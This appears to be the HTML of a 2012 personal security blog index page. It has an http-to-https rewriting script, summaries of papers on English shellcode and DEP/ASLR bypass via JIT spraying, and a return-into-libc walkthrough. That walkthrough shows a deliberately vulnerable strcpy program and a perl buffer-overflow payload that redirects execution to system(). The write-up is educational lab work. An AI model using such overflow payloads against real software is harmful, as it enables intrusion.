</span><span class='line'>        <span class="nx">link</span> <span class="o">=</span> <span class="nx">links</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">href</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="s1">&#39;https:&#39;</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">links</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">link</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// http to https for &lt;script&gt;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">scripts</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">scripts</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">scripts</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">script</span> <span class="o">=</span> <span class="nx">scripts</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="s1">&#39;https:&#39;</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">scripts</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">script</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// http to https for images</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">images</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">images</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">images</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">img</span> <span class="o">=</span> <span class="nx">images</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="s1">&#39;https:&#39;</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">images</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">img</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Maybe folks from KBIT.dk will add it to their chrome extensions <a href="https://code.google.com/p/kbsslenforcer/">KB SSL Enforcer</a>. Anyway, my Internet looks much better now =) and safer!</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2012-12-23T11:15:00-08:00" pubdate data-updated="true">Dec 23<span>rd</span>, 2012</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/https/'>https</a>, <a class='category' href='/blog/categories/js/'>js</a>, <a class='category' href='/blog/categories/security/'>security</a>, <a class='category' href='/blog/categories/ssl/'>ssl</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2012/12/10/english-shellcode/">English Shellcode</a></h1>
	<div class="entry-content">
		<p>This paper demonstrate a technique for automatically producing English Shellcode — that is, transforming arbitrary shellcode into a representation that is statistically similar to English prose.</p>

<p><img src="http://pix.am/kWJT.png" alt="" /></p>

<p><a title="View Ccs243 Mason on Scribd" href="http://www.scribd.com/doc/116712351/Ccs243-Mason" style="margin: 12px auto 6px auto; font-family: Helvetica,Arial,Sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; display: block; text-decoration: underline;">Ccs243 Mason</a><iframe class="scribd_iframe_embed" src="http://www.scribd.com/embeds/116712351/content?start_page=1&view_mode=scroll&access_key=key-kfmhab4cfcscgy1dh9i" data-auto-height="false" data-aspect-ratio="0.772727272727273" scrolling="no" id="doc_18420" width="100%" height="600" frameborder="0"></iframe></p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2012-12-10T21:56:00-08:00" pubdate data-updated="true">Dec 10<span>th</span>, 2012</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/security/'>security</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2012/12/09/bypassing-dep-slash-aslr-protections/">Bypassing DEP/ASLR Protections</a></h1>
	<div class="entry-content">
		<p>Today we are going to learn about data execution prevention (DEP) and address space layout randomization (ASLR). Last Sunday I read about <a href="http://khakimov.com/blog/2012/12/02/return-into-libc-without-function-calls/">return-into-libc</a> and one week before was post about <a href="http://khakimov.com/blog/2012/11/20/buffer-overflow/">buffer overflow</a> as-is. Both methods reqired to know the address of attacker shellcode and/or standard kernel library (we found out the address of system() function in the memory to use it in <strong>return-into-libc</strong> with this code int main() { system();}). Modern systems decided to implement something what will make stack addresses and addressess of library routines unpredictable and different from machine to machine (no more universal exploits =) kidding).</p>

<p>Author <a href="https://twitter.com/justdionysus">Dionysus Blazakis</a> holds BS from University of Maryland and doing interesting things, I saw his presentation &#8220;The Apple Sandbox&#8221; and then found this paper, great job Dionysus. I inspired by his example and it motivates me to keep digging in research field. Dion, if you&#8217;ll ever read this I just want to say thank you! Lets get back to his paper and read what this smart fellow prepared for us.</p>

<p><a title="View Blazakis on Scribd" href="http://www.scribd.com/doc/116197211/Blazakis" style="margin: 12px auto 6px auto; font-family: Helvetica,Arial,Sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; display: block; text-decoration: underline;">Blazakis</a><iframe class="scribd_iframe_embed" src="http://www.scribd.com/embeds/116197211/content?start_page=1&view_mode=scroll&access_key=key-1dr5xy06ojvmp97eq1hg" data-auto-height="false" data-aspect-ratio="0.772727272727273" scrolling="no" id="doc_39852" width="100%" height="600" frameborder="0"></iframe></p>

<p>DEP and ASLR are very real problem in the side of an exploit developer. DEP makes locating shellcode difficult, ASLR further complicates an attack by obfuscating the base address of the loaded data. Adobe Flash Player is used as an example, Dion also referenced to JIT spraying (Just-In-Time).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A Just-in-time compiler (JIT), by definition, produces machine 
</span><span class='line'>code as its output. Since it produces executable data, a JIT 
</span><span class='line'>compiler is one of the few types of programs that **cannot** be 
</span><span class='line'>run in a **no-executable-data environment**. Therefore, JIT 
</span><span class='line'>compilers are normally exempt from data execution prevention. A 
</span><span class='line'>JIT spray compiles code that then proceeds to spray the memory 
</span><span class='line'>with enough instances of exploit code to overwhelm the address 
</span><span class='line'>space randomization and execute the exploit itself.</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>JIT spraying is very simular to heap spraying, in simple terms attacker stuff heap with multiple copies of attack code (payload) and that increases the chances of successful exploitation.</p>

<p>JIT Spray Exploit Demo</p>

<iframe width="640" height="480" src="http://www.youtube.com/embed/HJuBpciJ3Ao?rel=0" frameborder="0" allowfullscreen></iframe>


<p>So, why do you need this? If you found the overflow in the modern browsers you will not able to use it easily, because of randomization, the address space is randomized and you don&#8217;t know where to point EIP and even if you have data in the heap DEP wont allow you to execute it. But you can use Just-In-Time compiler which will allocate writable memory for you and write executable code into it. For more details please read the paper above. Enjoy!</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2012-12-09T21:13:00-08:00" pubdate data-updated="true">Dec 9<span>th</span>, 2012</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/computer-security/'>computer security</a>, <a class='category' href='/blog/categories/great-papers/'>great papers</a>, <a class='category' href='/blog/categories/research/'>research</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2012/12/05/you-and-your-research/">You and Your Research</a></h1>
	<div class="entry-content">
		<iframe width="853" height="480" src="http://www.youtube.com/embed/JoVx_-bM8Tg?rel=0" frameborder="0" allowfullscreen></iframe>


<p><a href="https://conference.hitb.org/hitbsecconf2012kul/materials/D1T2%20-%20Haroon%20Meer%20-%20You%20and%20Your%20Research.pdf">PDF</a></p>

<p>What does it take to do quality research? What stops you from being a one-hit wonder? Is there an age limit to productive hackery? What are the key ingredients needed and how can you up your chances of doing great work? In a talk unabashedly stolen from far greater minds we hope to answer these questions and discuss their repercussions.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2012-12-05T16:43:00-08:00" pubdate data-updated="true">Dec 5<span>th</span>, 2012</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/-hitb2012kul/'>#HITB2012KUL</a>, <a class='category' href='/blog/categories/motivation/'>motivation</a>, <a class='category' href='/blog/categories/research/'>research</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2012/12/02/return-into-libc-without-function-calls/">Return-into-libc Without Function Calls</a></h1>
	<div class="entry-content">
		<p>Since OpenBSD has a nonexecutable stack by default and you can also patch your Linux kernel and make nonexecutable stack through PaX, AMD and Intel recently added to their processors a per-page execute disable bit to ease WOX implementation and even Microsoft implement WOX (no location in memory into which the attacker can inject code to execute, or just imagine no memory location in a process image is marked both writable - W and executable - X) all it means you can not execute your shellcode on the stack.</p>

<p>Today I read about technique is known as <strong>return into libc</strong> by <a href="http://cseweb.ucsd.edu/~hovav/">Hovav Shacham</a> (btw, his Ph.D. advisor was professor of Computer Science and Electrial Engineering at Stanford <a href="http://crypto.stanford.edu/~dabo/">Dan Boneh</a>. I took his CS155 class, he is really good in his field).</p>

<p>What is this about? If we can&#8217;t write in stack what should we do? We can&#8217;t inject code, so, we will use code that already exists in the proccess image we are attacking. <strong>Libc</strong> is the usual target that contains various basic functions, such as printf() and exit(). These functions are share, so any program that uses the printf() function directs execution into the appropriate location in libc. And attacker with his explout can do the same thing and direct a program&#8217;s execution into a certain function in libc. But in principle any available code, either from the program&#8217;s text segment of from a library it links to, could be used instead libc.</p>

<p>Enjoy!</p>

<p><a title="View Geometry (1) on Scribd" href="http://www.scribd.com/doc/115228599/Geometry-1" style="margin: 12px auto 6px auto; font-family: Helvetica,Arial,Sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; display: block; text-decoration: underline;">Geometry (1)</a><iframe class="scribd_iframe_embed" src="http://www.scribd.com/embeds/115228599/content?start_page=1&view_mode=scroll&access_key=key-1qjla86da9zi8xelaiqr" data-auto-height="false" data-aspect-ratio="0.772727272727273" scrolling="no" id="doc_22341" width="100%" height="600" frameborder="0"></iframe></p>

<p>I played a litle bit with <strong>return into libc</strong> and the main idea was to force the program to spawn a shell without executing anything on the stack, by returning int the libc function system().</p>

<figure class='code'><figcaption><span>sys.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span><span class='line'>   <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span> <span class="n">system</span><span class="p">();</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">t</span> <span class="n">tmp</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">t</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="n">main</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804837a</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
</span><span class='line'><span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804837a</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">print</span> <span class="n">system</span>
</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7ed0d80</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">quit</span>
</span></code></pre></td></tr></table></div></figure>


<p>here we got address of function <strong>system()</strong> and it is located at <strong>0xb7ed0d80</strong>.</p>

<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;AAAA&quot;</span><span class="n">x7</span> <span class="p">.</span> <span class="s">&quot;</span><span class="se">\x80\x0d\xed\xb7</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nl">sh:</span> <span class="o">????????:</span> <span class="n">command</span> <span class="n">not</span> <span class="n">found</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>7 words of data are used for spacin in the exploit and then we call system() as you can see. In this example I don&#8217;t pass any arguments, but it&#8217;s should be of course &#8220;/bin/sh&#8221;. That&#8217;s my Sunday and happy hacking hours!</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2012-12-02T14:12:00-08:00" pubdate data-updated="true">Dec 2<span>nd</span>, 2012</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/computer-security/'>computer security</a>, <a class='category' href='/blog/categories/great-papers/'>great papers</a>, <a class='category' href='/blog/categories/research/'>research</a>


</div>
	
</div></article>

<nav id="pagenavi">
    
        <a href="/blog/page/5/" class="prev">Prev</a>
    
    
        <a href="/blog/page/7/" class="next">Next</a>
    
    <div class="center"><a href="/blog/archives">Blog Archives</a></div>
</nav></div>
	<footer id="footer" class="inner">Copyright &copy; 2013

    khakimov

</footer>
	<script src="/javascripts/slash.js"></script>
<script type="text/javascript">
var _hcp = _hcp || {};
_hcp.widget_id = 2313;
_hcp.widget = "Stream";
(function() { 
var hcc = document.createElement("script"); hcc.type = "text/javascript"; hcc.async = true;
hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://widget.hypercomments.com/apps/js/hc.js";
var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hcc, s.nextSibling); 
})();</script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->




	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-31552911-1']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>



</body>
</html>